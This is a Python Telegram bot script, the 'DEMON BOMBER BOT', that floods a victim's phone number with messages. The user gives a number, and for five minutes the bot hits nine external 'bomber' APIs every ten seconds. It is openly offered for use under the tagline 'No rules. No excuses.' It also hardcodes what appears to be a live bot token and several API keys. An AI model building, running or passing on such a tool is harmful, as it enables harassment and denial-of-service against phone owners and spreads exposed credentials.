#!/usr/bin/env python3
# DEMON 😈 BOMBER BOT - RAILWAY FIXED
# HARDCODED TOKEN - CHUTIYA PROOF

import os
import asyncio
import logging
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from aiohttp import web

# ========== HARDCODED BOT TOKEN (YAHAN DAALO) ==========
BOT_TOKEN = "8643322725:AAG45lf0GkMuRLChKNa6K2f2mSRa8tY-FiM"  # @BotFather se lo aur yahan daalo!

# ========== CONFIG ==========
BOMB_DURATION = 300  # 5 minutes
CHECK_INTERVAL = 10   # 10 seconds

API_LIST = [
    {"name": "🔥 Ultra Bomber", "url": "https://ultra-bomber-wo5r.onrender.com/bomb", "params": {"key": "admin123"}, "phone_param": "phone"},
    {"name": "💀 Ultra Brutal", "url": "https://ultra-brutal-bomber-njde.onrender.com/bomb", "params": {}, "phone_param": "phone"},
    {"name": "🚀 Part 1", "url": "https://bomber-part-1-kzn0.onrender.com/bomb", "params": {"key": "shuvo"}, "phone_param": "phone"},
    {"name": "⚡ Part 2", "url": "https://brutal-bomber-part-2-6dhd.onrender.com/bomb", "params": {"key": "shuvo"}, "phone_param": "phone"},
    {"name": "💣 Bomber Pro", "url": "https://bomber-pro-r88e.onrender.com/bomb", "params": {"key": "shuvo", "cycles": 10}, "phone_param": "phone"},
    {"name": "🎯 Bomber APIs", "url": "https://bomber-apis-g0sf.onrender.com/bom", "params": {"key": "felix"}, "phone_param": "num"},
    {"name": "🐍 Felix Bomber", "url": "https://felix-bom-irju.onrender.com/bom", "params": {"key": "demo"}, "phone_param": "num"},
    {"name": "🤖 Bomber 3SKM", "url": "https://bomber-3skm.onrender.com/bom", "params": {"key": "felix"}, "phone_param": "num"},
    {"name": "👾 Shuvo Bomber", "url": "https://bomber-by-shuvo.onrender.com/bomb", "params": {}, "phone_param": "phone"}
]

# ========== LOGGING ==========
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ========== BOMBER ENGINE ==========
active_sessions = {}

async def bomb_single_api(api, phone):
    import aiohttp
    params = api["params"].copy()
    params[api["phone_param"]] = phone
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api["url"], params=params, timeout=15) as resp:
                if resp.status == 200:
                    return {"success": True, "api": api["name"]}
                return {"success": False, "api": api["name"], "error": f"Status {resp.status}"}
    except Exception as e:
        return {"success": False, "api": api["name"], "error": str(e)}

async def continuous_bombing(phone, user_id):
    active_sessions[user_id] = {"phone": phone, "start_time": datetime.now(), "active": True}
    start_time = datetime.now()
    end_time = start_time + timedelta(seconds=BOMB_DURATION)
    cycle_count = 0
    
    logger.info(f"[⚡] Starting bombing for {phone}")
    
    while datetime.now() < end_time and active_sessions.get(user_id, {}).get("active", False):
        cycle_count += 1
        tasks = [bomb_single_api(api, phone) for api in API_LIST]
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r.get("success"))
        logger.info(f"[🔄] Cycle {cycle_count}: {success} OK")
        
        if not active_sessions.get(user_id, {}).get("active", False):
            break
        await asyncio.sleep(CHECK_INTERVAL)
    
    if active_sessions.get(user_id, {}).get("active", False):
        active_sessions[user_id]["active"] = False
    
    return {"total_cycles": cycle_count, "phone": phone}

async def stop_bombing(user_id):
    if user_id in active_sessions:
        active_sessions[user_id]["active"] = False
        return True
    return False

def get_status(user_id):
    if user_id in active_sessions:
        session = active_sessions[user_id]
        if session.get("active", False):
            elapsed = (datetime.now() - session["start_time"]).seconds
            remaining = max(0, BOMB_DURATION - elapsed)
            return {"active": True, "phone": session["phone"], "remaining": remaining}
    return {"active": False}

# ========== KEYBOARDS ==========
main_keyboard = ReplyKeyboardMarkup([
    [KeyboardButton("💣 START 5-MIN BOMB"), KeyboardButton("🛑 STOP BOMBING")],
    [KeyboardButton("📊 STATUS"), KeyboardButton("ℹ️ HELP")]
], resize_keyboard=True)

inline_keyboard = InlineKeyboardMarkup([
    [InlineKeyboardButton("☢️ START MEGA BOMB", callback_data="start")],
    [InlineKeyboardButton("🛑 STOP", callback_data="stop")],
    [InlineKeyboardButton("📊 STATUS", callback_data="status")]
])

# ========== COMMANDS ==========
async def start(update: Update, context):
    await update.message.reply_text(
        f"""🔥 *DEMON 😈 BOMBER BOT*

*Commands:*
`/bomb <phone>` - Start 5-min bomb
`/stop` - Stop bombing
`/status` - Check status

*Example:* `/bomb 9876543210`

😈 *"No rules. No excuses."*
""",
        parse_mode='Markdown',
        reply_markup=main_keyboard
    )

async def bomb_command(update: Update, context):
    args = context.args
    if not args:
        await update.message.reply_text("❌ *Usage:* `/bomb 9876543210`", parse_mode='Markdown')
        return
    
    phone = args[0]
    if not phone.isdigit() or len(phone) < 10:
        await update.message.reply_text("❌ *Invalid phone!*", parse_mode='Markdown')
        return
    
    user_id = update.effective_user.id
    status = get_status(user_id)
    if status["active"]:
        await update.message.reply_text(f"⚠️ *Already bombing!* Remaining: {status['remaining']}s", parse_mode='Markdown')
        return
    
    status_msg = await update.message.reply_text(f"☢️ *BOMBING!* 📱 `{phone}`", parse_mode='Markdown')
    result = await continuous_bombing(phone, user_id)
    await status_msg.edit_text(f"💀 *DONE!* 📱 `{phone}` 🔄 {result['total_cycles']} cycles", parse_mode='Markdown')

async def stop_command(update: Update, context):
    if await stop_bombing(update.effective_user.id):
        await update.message.reply_text("🛑 *STOPPED!*", parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ *No active bombing!*", parse_mode='Markdown')

async def status_command(update: Update, context):
    status = get_status(update.effective_user.id)
    if status["active"]:
        await update.message.reply_text(f"📊 *ACTIVE* 📱 `{status['phone']}` ⏳ {status['remaining']}s", parse_mode='Markdown')
    else:
        await update.message.reply_text("📊 *IDLE*", parse_mode='Markdown')

async def handle_message(update: Update, context):
    text = update.message.text
    if text == "💣 START 5-MIN BOMB":
        await update.message.reply_text("📱 *Enter phone number:*", parse_mode='Markdown')
        context.user_data['awaiting_phone'] = True
    elif text == "🛑 STOP BOMBING":
        await stop_command(update, context)
    elif text == "📊 STATUS":
        await status_command(update, context)
    elif text == "ℹ️ HELP":
        await start(update, context)
    elif context.user_data.get('awaiting_phone'):
        phone = text.strip()
        if phone.isdigit() and len(phone) >= 10:
            context.user_data['awaiting_phone'] = False
            user_id = update.effective_user.id
            status = get_status(user_id)
            if status["active"]:
                await update.message.reply_text("⚠️ *Already bombing!*", parse_mode='Markdown')
                return
            status_msg = await update.message.reply_text(f"☢️ *BOMBING!* 📱 `{phone}`", parse_mode='Markdown')
            result = await continuous_bombing(phone, user_id)
            await status_msg.edit_text(f"💀 *DONE!* 📱 `{phone}` 🔄 {result['total_cycles']} cycles", parse_mode='Markdown')
        else:
            await update.message.reply_text("❌ *Invalid phone!*", parse_mode='Markdown')

async def handle_callback(update: Update, context):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id
    
    if data == "start":
        phone = context.user_data.get('phone')
        if not phone:
            await query.edit_message_text("❌ *No phone!* Use /bomb", parse_mode='Markdown')
            return
        status = get_status(user_id)
        if status["active"]:
            await query.edit_message_text(f"⚠️ *Already bombing!*", parse_mode='Markdown')
            return
        await query.edit_message_text(f"☢️ *BOMBING!* 📱 `{phone}`", parse_mode='Markdown')
        result = await continuous_bombing(phone, user_id)
        await query.edit_message_text(f"💀 *DONE!* 📱 `{phone}` 🔄 {result['total_cycles']} cycles", parse_mode='Markdown')
    elif data == "stop":
        if await stop_bombing(user_id):
            await query.edit_message_text("🛑 *STOPPED!*", parse_mode='Markdown')
        else:
            await query.edit_message_text("❌ *No active bombing!*", parse_mode='Markdown')
    elif data == "status":
        status = get_status(user_id)
        if status["active"]:
            await query.edit_message_text(f"📊 *ACTIVE* 📱 `{status['phone']}` ⏳ {status['remaining']}s", parse_mode='Markdown')
        else:
            await query.edit_message_text("📊 *IDLE*", parse_mode='Markdown')

# ========== WEB SERVER FOR RAILWAY ==========
async def web_server():
    async def health(request):
        return web.Response(text="OK", status=200)
    app = web.Application()
    app.router.add_get('/', health)
    app.router.add_get('/health', health)
    port = int(os.environ.get("PORT", 8080))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, host="0.0.0.0", port=port)
    await site.start()
    logger.info(f"[🌐] Web server on port {port}")
    await asyncio.Event().wait()

# ========== MAIN ==========
async def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bomb", bomb_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(handle_callback))
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    logger.info("[⚡] DEMON 😈 BOT IS ALIVE!")
    await asyncio.gather(web_server())

if __name__ == "__main__":
    asyncio.run(main())
